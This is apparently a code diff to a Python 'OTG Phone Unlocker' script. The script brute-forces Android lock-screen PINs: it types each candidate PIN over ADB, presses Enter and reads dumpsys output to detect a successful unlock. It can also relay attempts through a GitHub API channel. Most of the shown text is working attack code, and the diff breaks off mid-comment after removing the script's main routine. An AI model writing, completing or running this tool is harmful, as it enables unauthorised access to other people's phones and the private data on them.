@@ -10,12 +10,13 @@ from datetime import datetime
 class OTGUnlocker:
     def __init__(self):
         self.target_device = None
-        self.api_endpoint = "https://api.github.com"  # GitHub API endpoint
+        self.api_endpoint = "https://api.github.com"
         self.session = requests.Session()
         self.attempts = 0
         self.success = False
         self.start_time = None
         self.results = []
+        self.device_connected = False
         
     def setup_github_environment(self):
         """Setup environment for GitHub-based execution"""
@@ -34,6 +35,38 @@ class OTGUnlocker:
             return False
             
         return True
+    
+    def check_otg_connection(self):
+        """Check if a device is connected via OTG"""
+        print("Checking for OTG-connected devices...")
+        
+        try:
+            # Check for Android devices via ADB
+            result = subprocess.run(['adb', 'devices'], 
+                                  capture_output=True, text=True)
+            if result.returncode == 0:
+                lines = result.stdout.strip().split('\n')[1:]  # Skip first line
+                for line in lines:
+                    if line.strip() and 'device' in line:
+                        device_id = line.split('\t')[0]
+                        print(f"Found connected device: {device_id}")
+                        self.target_device = device_id
+                        self.device_connected = True
+                        return True
+                        
+            # Alternative method for non-ADB devices
+            result = subprocess.run(['lsusb'], capture_output=True, text=True)
+            if result.returncode == 0:
+                for line in result.stdout.split('\n'):
+                    if 'Phone' in line or 'Android' in line:
+                        print(f"Found potential phone device in USB list")
+                        self.device_connected = True
+                        return True
+        except Exception as e:
+            print(f"Error checking OTG connection: {str(e)}")
+            
+        print("No OTG-connected device found")
+        return False
     
     def register_device(self, device_id):
         """Register a device for unlocking via GitHub API"""
@@ -147,10 +180,42 @@ class OTGUnlocker:
             print(f"Error checking status: {str(e)}")
             return False
     
-    def brute_force_pin(self, device_id, pin_length=4):
-        """Brute force PIN using GitHub API"""
+    def try_pin_locally(self, pin):
+        """Try to unlock the device locally via ADB"""
+        if not self.device_connected or not self.target_device:
+            return False
+            
+        try:
+            # Send PIN using input event simulation
+            cmd = f"adb -s {self.target_device} shell input text {pin}"
+            result = subprocess.run(cmd.split(), capture_output=True, text=True)
+            
+            # Press Enter
+            subprocess.run(['adb', '-s', self.target_device, 'shell', 'input', 'keyevent', 'KEYCODE_ENTER'])
+            
+            # Check if unlock was successful
+            time.sleep(2)  # Wait for the device to process
+            
+            # Check if device is unlocked
+            result = subprocess.run(
+                ['adb', '-s', self.target_device, 'shell', 'dumpsys', 'window'],
+                capture_output=True, text=True
+            )
+            
+            if result.returncode == 0:
+                if 'mDreamingLockscreen=false' in result.stdout and 'mShowingLockscreen=false' in result.stdout:
+                    return True
+                    
+        except Exception as e:
+            print(f"Error trying PIN locally: {str(e)}")
+            
+        return False
+    
+    def brute_force_pin(self, device_id, pin_length=4, use_github=False):
+        """Brute force PIN using either local ADB or GitHub API"""
         print(f"Starting brute force attack on device {device_id}")
         print(f"PIN length: {pin_length} digits")
+        print(f"Using {'GitHub API' if use_github else 'local ADB'} for execution")
         
         self.start_time = time.time()
         self.attempts = 0
@@ -174,104 +239,27 @@ class OTGUnlocker:
             self.attempts += 1
             print(f"Attempt #{self.attempts}: Trying PIN {pin}")
             
-            # Send unlock command
-            command_id = self.send_unlock_command(device_id, pin)
-            if not command_id:
-                print("Failed to send unlock command")
-                continue
-            
-            # Wait for status update
-            status = None
-            max_wait = 30  # Maximum wait time in seconds
-            wait_time = 0
-            
-            while status is None and wait_time < max_wait:
-                time.sleep(2)
-                wait_time += 2
-                status = self.check_unlock_status(command_id)
-            
-            if status:
-                self.success = True
-                elapsed_time = time.time() - self.start_time
-                print(f"\nSUCCESS! Device unlocked with PIN: {pin}")
-                print(f"Total attempts: {self.attempts}")
-                print(f"Time elapsed: {elapsed_time:.2f} seconds")
+            if use_github:
+                # Send unlock command via GitHub
+                command_id = self.send_unlock_command(device_id, pin)
+                if not command_id:
+                    print("Failed to send unlock command")
+                    continue
                 
-                # Store result
-                self.results.append({
-                    'pin': pin,
-                    'attempts': self.attempts,
-                    'time': elapsed_time,
-                    'success': True
-                })
-                return True
-            elif status is False:
-                # PIN was incorrect
-                print(f"PIN {pin} was incorrect")
-                self.results.append({
-                    'pin': pin,
-                    'attempts': self.attempts,
-                    'time': time.time() - self.start_time,
-                    'success': False
-                })
+                # Wait for status update
+                status = None
+                max_wait = 30  # Maximum wait time in seconds
+                wait_time = 0
                 
-        if not self.success:
-            elapsed_time = time.time() - self.start_time
-            print(f"\nFailed to unlock device after {self.attempts} attempts")
-            print(f"Time elapsed: {elapsed_time:.2f} seconds")
-            
-        return False
-    
-    def save_results(self):
-        """Save results to a file"""
-        results_file = f"unlock_results_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
-        with open(results_file, 'w') as f:
-            json.dump({
-                'device': self.target_device,
-                'attempts': self.attempts,
-                'success': self.success,
-                'start_time': self.start_time,
-                'results': self.results
-            }, f, indent=2)
-        print(f"Results saved to {results_file}")
-    
-    def run(self):
-        """Main method to run the unlocker"""
-        print("OTG Phone Unlocker - GitHub Edition")
-        print("===================================")
-        
-        # Setup GitHub environment
-        if not self.setup_github_environment():
-            print("Failed to setup GitHub environment")
-            return
-            
-        # Get device ID
-        device_id = input("Enter device ID to unlock: ")
-        if not device_id:
-            print("No device ID provided")
-            return
-            
-        self.target_device = device_id
-        
-        # Register device
-        registration_id = self.register_device(device_id)
-        if not registration_id:
-            print("Failed to register device")
-            return
-            
-        # Get PIN length
-        try:
-            pin_length = int(input("Enter PIN length (default 4): ") or "4")
-        except ValueError:
-            print("Invalid PIN length, using default (4)")
-            pin_length = 4
-            
-        # Start brute force attack
-        self.brute_force_pin(device_id, pin_length)
-        
-        # Save results
-        self.save_results()
-
-if __name__ == "__main__":
-    print("OTG Phone Unlocker - GitHub Edition")
-    print("===================================")
+                while status is None and wait_time < max_wait:
+                    time.sleep(2)
+                    wait_time += 2
+                    status = self.check_unlock_status(command_id)
+                
+                if status:
+                    self.success = True
+                elif status is False:
+                    # PIN was incorrect
+                    print(f"PIN {pin} was incorrect")
+            else:
+                # Try PIN locally via
